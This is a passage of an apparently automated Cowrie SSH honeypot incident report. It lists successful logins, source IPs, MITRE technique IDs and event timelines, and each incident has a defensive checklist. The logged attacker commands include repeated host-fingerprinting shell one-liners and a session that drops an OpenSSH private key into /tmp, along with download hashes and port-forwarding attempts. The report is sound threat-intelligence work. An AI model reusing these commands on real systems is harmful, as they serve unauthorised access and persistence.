| `2026-09-04 06:58:38` | `cowrie.session.params` |
| `2026-09-04 06:58:38` | `cowrie.command.input` |
| `2026-09-04 06:58:38` | `cowrie.log.closed` |
| `2026-09-04 06:58:40` | `cowrie.session.params` |
| `2026-09-04 06:58:40` | `cowrie.command.input` |
| `2026-09-04 06:58:40` | `cowrie.log.closed` |
| `2026-09-04 06:58:41` | `cowrie.session.params` |
| `2026-09-04 06:58:41` | `cowrie.command.input` |
| `2026-09-04 06:58:41` | `cowrie.log.closed` |
| `2026-09-04 06:58:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `219.78.63[.]235` to AbuseIPDB if not already reported
- [ ] Block `219.78.63[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-176fe4391050

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-09-04 06:59 |
| **Last Seen** | 2026-09-04 06:59 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 06:59:29` | `cowrie.session.connect` |
| `2026-09-04 06:59:30` | `cowrie.client.version` |
| `2026-09-04 06:59:30` | `cowrie.client.kex` |
| `2026-09-04 06:59:35` | `cowrie.login.success` |
| `2026-09-04 06:59:38` | `cowrie.session.params` |
| `2026-09-04 06:59:38` | `cowrie.command.input` |
| `2026-09-04 06:59:38` | `cowrie.command.input` |
| `2026-09-04 06:59:38` | `cowrie.command.input` |
| `2026-09-04 06:59:38` | `cowrie.command.input` |
| `2026-09-04 06:59:38` | `cowrie.command.input` |
| `2026-09-04 06:59:38` | `cowrie.command.success` |
| `2026-09-04 06:59:38` | `cowrie.command.input` |
| `2026-09-04 06:59:38` | `cowrie.command.input` |
| `2026-09-04 06:59:38` | `cowrie.command.input` |
| `2026-09-04 06:59:38` | `cowrie.command.input` |
| `2026-09-04 06:59:41` | `cowrie.log.closed` |
| `2026-09-04 06:59:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18b71bfe3472

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-09-04 07:01 |
| **Last Seen** | 2026-09-04 07:01 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 07:01:34` | `cowrie.session.connect` |
| `2026-09-04 07:01:35` | `cowrie.client.version` |
| `2026-09-04 07:01:35` | `cowrie.client.kex` |
| `2026-09-04 07:01:40` | `cowrie.login.success` |
| `2026-09-04 07:01:43` | `cowrie.session.params` |
| `2026-09-04 07:01:43` | `cowrie.command.input` |
| `2026-09-04 07:01:43` | `cowrie.command.input` |
| `2026-09-04 07:01:43` | `cowrie.command.input` |
| `2026-09-04 07:01:43` | `cowrie.command.input` |
| `2026-09-04 07:01:43` | `cowrie.command.input` |
| `2026-09-04 07:01:43` | `cowrie.command.success` |
| `2026-09-04 07:01:43` | `cowrie.command.input` |
| `2026-09-04 07:01:43` | `cowrie.command.input` |
| `2026-09-04 07:01:43` | `cowrie.command.input` |
| `2026-09-04 07:01:43` | `cowrie.command.input` |
| `2026-09-04 07:01:44` | `cowrie.log.closed` |
| `2026-09-04 07:01:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d12f6784c2af

| Field | Detail |
|---|---|
| **Source IP** | `61.146.235[.]54` |
| **First Seen** | 2026-09-04 07:03 |
| **Last Seen** | 2026-09-04 07:03 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 07:03:01` | `cowrie.session.connect` |
| `2026-09-04 07:03:01` | `cowrie.client.version` |
| `2026-09-04 07:03:05` | `cowrie.client.kex` |
| `2026-09-04 07:03:07` | `cowrie.login.success` |
| `2026-09-04 07:03:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.146.235[.]54` to AbuseIPDB if not already reported
- [ ] Block `61.146.235[.]54` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c8660e10335

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-09-04 07:03 |
| **Last Seen** | 2026-09-04 07:03 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----; b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW; QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ; 0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg; AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9; Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=; -----END OPENSSH PRIVATE KEY-----' > key.p` |
| **Download Attempts** | ae8d459595257f2f22c9d1ff74c4fb8a91643fad7899b57556496716692b904e, 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca |
| **Malware Analysis** | 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 07:03:12` | `cowrie.session.connect` |
| `2026-09-04 07:03:12` | `cowrie.client.version` |
| `2026-09-04 07:03:12` | `cowrie.client.kex` |
| `2026-09-04 07:03:12` | `cowrie.login.success` |
| `2026-09-04 07:03:14` | `cowrie.session.params` |
| `2026-09-04 07:03:14` | `cowrie.command.input` |
| `2026-09-04 07:03:14` | `cowrie.session.file_download` |
| `2026-09-04 07:03:14` | `cowrie.session.file_download` |
| `2026-09-04 07:03:14` | `cowrie.log.closed` |
| `2026-09-04 07:03:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d019fc52df4

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-09-04 07:03 |
| **Last Seen** | 2026-09-04 07:03 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 07:03:36` | `cowrie.session.connect` |
| `2026-09-04 07:03:36` | `cowrie.client.version` |
| `2026-09-04 07:03:36` | `cowrie.client.kex` |
| `2026-09-04 07:03:42` | `cowrie.login.success` |
| `2026-09-04 07:03:45` | `cowrie.session.params` |
| `2026-09-04 07:03:45` | `cowrie.command.input` |
| `2026-09-04 07:03:45` | `cowrie.command.input` |
| `2026-09-04 07:03:45` | `cowrie.command.input` |
| `2026-09-04 07:03:45` | `cowrie.command.input` |
| `2026-09-04 07:03:45` | `cowrie.command.input` |
| `2026-09-04 07:03:45` | `cowrie.command.success` |
| `2026-09-04 07:03:45` | `cowrie.command.input` |
| `2026-09-04 07:03:45` | `cowrie.command.input` |
| `2026-09-04 07:03:45` | `cowrie.command.input` |
| `2026-09-04 07:03:45` | `cowrie.command.input` |
| `2026-09-04 07:03:46` | `cowrie.log.closed` |
| `2026-09-04 07:03:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52b79074ebf5

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-04 07:03 |
| **Last Seen** | 2026-09-04 07:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 07:03:39` | `cowrie.session.connect` |
| `2026-09-04 07:03:39` | `cowrie.client.version` |
| `2026-09-04 07:03:39` | `cowrie.client.kex` |
| `2026-09-04 07:03:40` | `cowrie.login.success` |
| `2026-09-04 07:03:40` | `cowrie.direct-tcpip.request` |
| `2026-09-04 07:03:41` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-04 07:03:41` | `cowrie.direct-tcpip.data` |
| `2026-09-04 07:03:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1da9960f8f96

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-04 07:05 |
| **Last Seen** | 2026-09-04 07:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 07:05:14` | `cowrie.session.connect` |
| `2026-09-04 07:05:14` | `cowrie.client.version` |
| `2026-09-04 07:05:14` | `cowrie.client.kex` |
| `2026-09-04 07:05:14` | `cowrie.login.success` |
| `2026-09-04 07:05:15` | `cowrie.direct-tcpip.request` |
| `2026-09-04 07:05:15` | `cowrie.direct-tcpip.data` |
| `2026-09-04 07:05:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0bf9d0f7067f

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-09-04 07:05 |
| **Last Seen** | 2026-09-04 07:06 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 07:05:53` | `cowrie.session.connect` |
| `2026-09-04 07:05:55` | `cowrie.client.version` |
| `2026-09-04 07:05:55` | `cowrie.client.kex` |
| `2026-09-04 07:06:01` | `cowrie.login.success` |
| `2026-09-04 07:06:06` | `cowrie.session.params` |
| `2026-09-04 07:06:06` | `cowrie.command.input` |
| `2026-09-04 07:06:06` | `cowrie.command.input` |
| `2026-09-04 07:06:06` | `cowrie.command.input` |
| `2026-09-04 07:06:06` | `cowrie.command.input` |
| `2026-09-04 07:06:06` | `cowrie.command.input` |
| `2026-09-04 07:06:06` | `cowrie.command.success` |
| `2026-09-04 07:06:06` | `cowrie.command.input` |
| `2026-09-04 07:06:06` | `cowrie.command.input` |
| `2026-09-04 07:06:06` | `cowrie.command.input` |
| `2026-09-04 07:06:06` | `cowrie.command.input` |
| `2026-09-04 07:06:07` | `cowrie.log.closed` |
| `2026-09-04 07:06:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df500b3bcf8c

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-09-04 07:08 |
| **Last Seen** | 2026-09-04 07:08 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 07:08:08` | `cowrie.session.connect` |
| `2026-09-04 07:08:11` | `cowrie.client.version` |
| `2026-09-04 07:08:11` | `cowrie.client.kex` |
| `2026-09-04 07:08:20` | `cowrie.login.success` |
| `2026-09-04 07:08:26` | `cowrie.session.params` |
| `2026-09-04 07:08:26` | `cowrie.command.input` |
| `2026-09-04 07:08:26` | `cowrie.command.input` |
| `2026-09-04 07:08:26` | `cowrie.command.input` |
| `2026-09-04 07:08:26` | `cowrie.command.input` |
| `2026-09-04 07:08:26` | `cowrie.command.input` |
| `2026-09-04 07:08:26` | `cowrie.command.success` |
| `2026-09-04 07:08:26` | `cowrie.command.input` |
| `2026-09-04 07:08:26` | `cowrie.command.input` |
| `2026-09-04 07:08:26` | `cowrie.command.input` |
| `2026-09-04 07:08:26` | `cowrie.command.input` |
| `2026-09-04 07:08:28` | `cowrie.log.closed` |
| `2026-09-04 07:08:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c0f1fa4e984

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-09-04 07:10 |
| **Last Seen** | 2026-09-04 07:10 |
| **Session Duration** | 32s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 07:10:23` | `cowrie.session.connect` |
| `2026-09-04 07:10:26` | `cowrie.client.version` |
| `2026-09-04 07:10:26` | `cowrie.client.kex` |
| `2026-09-04 07:10:40` | `cowrie.login.success` |
| `2026-09-04 07:10:47` | `cowrie.session.params` |
| `2026-09-04 07:10:47` | `cowrie.command.input` |
| `2026-09-04 07:10:47` | `cowrie.command.input` |
| `2026-09-04 07:10:47` | `cowrie.command.input` |
| `2026-09-04 07:10:47` | `cowrie.command.input` |
| `2026-09-04 07:10:47` | `cowrie.command.input` |
| `2026-09-04 07:10:47` | `cowrie.command.success` |
| `2026-09-04 07:10:47` | `cowrie.command.input` |
| `2026-09-04 07:10:47` | `cowrie.command.input` |
| `2026-09-04 07:10:47` | `cowrie.command.input` |
| `2026-09-04 07:10:47` | `cowrie.command.input` |
| `2026-09-04 07:10:51` | `cowrie.log.closed` |
| `2026-09-04 07:10:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79d4a1c58456

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-09-04 07:12 |
| **Last Seen** | 2026-09-04 07:13 |
| **Session Duration** | 35s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 07:12:38` | `cowrie.session.connect` |
| `2026-09-04 07:12:42` | `cowrie.client.version` |
| `2026-09-04 07:12:42` | `cowrie.client.kex` |
| `2026-09-04 07:12:56` | `cowrie.login.success` |
| `2026-09-04 07:13:05` | `cowrie.session.params` |
| `2026-09-04 07:13:05` | `cowrie.command.input` |
| `2026-09-04 07:13:05` | `cowrie.command.input` |
| `2026-09-04 07:13:05` | `cowrie.command.input` |
| `2026-09-04 07:13:05` | `cowrie.command.input` |
| `2026-09-04 07:13:05` | `cowrie.command.input` |
| `2026-09-04 07:13:05` | `cowrie.command.success` |
| `2026-09-04 07:13:05` | `cowrie.command.input` |
| `2026-09-04 07:13:05` | `cowrie.command.input` |
| `2026-09-04 07:13:05` | `cowrie.command.input` |
| `2026-09-04 07:13:05` | `cowrie.command.input` |
| `2026-09-04 07:13:09` | `cowrie.log.closed` |
| `2026-09-04 07:13:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2c659e09139

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-04 07:14 |
| **Last Seen** | 2026-09-04 07:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 07:14:39` | `cowrie.session.connect` |
| `2026-09-04 07:14:39` | `cowrie.client.version` |
| `2026-09-04 07:14:39` | `cowrie.client.kex` |
| `2026-09-04 07:14:40` | `cowrie.login.success` |
| `2026-09-04 07:14:40` | `cowrie.direct-tcpip.request` |
| `2026-09-04 07:14:40` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-04 07:14:40` | `cowrie.direct-tcpip.data` |
| `2026-09-04 07:14:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-737aba00b984

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-09-04 07:14 |
| **Last Seen** | 2026-09-04 07:15 |
| **Session Duration** | 35s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 07:14:48` | `cowrie.session.connect` |
| `2026-09-04 07:14:51` | `cowrie.client.version` |
| `2026-09-04 07:14:51` | `cowrie.client.kex` |
| `2026-09-04 07:15:06` | `cowrie.login.success` |
| `2026-09-04 07:15:15` | `cowrie.session.params` |
| `2026-09-04 07:15:15` | `cowrie.command.input` |
| `2026-09-04 07:15:15` | `cowrie.command.input` |
| `2026-09-04 07:15:15` | `cowrie.command.input` |
| `2026-09-04 07:15:15` | `cowrie.command.input` |
| `2026-09-04 07:15:15` | `cowrie.command.input` |
| `2026-09-04 07:15:15` | `cowrie.command.success` |
| `2026-09-04 07:15:15` | `cowrie.command.input` |
| `2026-09-04 07:15:15` | `cowrie.command.input` |
| `2026-09-04 07:15:15` | `cowrie.command.input` |
| `2026-09-04 07:15:15` | `cowrie.command.input` |
| `2026-09-04 07:15:19` | `cowrie.log.closed` |
| `2026-09-04 07:15:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-563d32b0763e

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-09-04 07:16 |
| **Last Seen** | 2026-09-04 07:17 |
| **Session Duration** | 36s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 07:16:45` | `cowrie.session.connect` |
| `2026-09-04 07:16:49` | `cowrie.client.version` |
| `2026-09-04 07:16:49` | `cowrie.client.kex` |
| `2026-09-04 07:17:05` | `cowrie.login.success` |
| `2026-09-04 07:17:14` | `cowrie.session.params` |
| `2026-09-04 07:17:14` | `cowrie.command.input` |
| `2026-09-04 07:17:14` | `cowrie.command.input` |
| `2026-09-04 07:17:14` | `cowrie.command.input` |
| `2026-09-04 07:17:14` | `cowrie.command.input` |
| `2026-09-04 07:17:14` | `cowrie.command.input` |
| `2026-09-04 07:17:14` | `cowrie.command.success` |
| `2026-09-04 07:17:14` | `cowrie.command.input` |
| `2026-09-04 07:17:14` | `cowrie.command.input` |
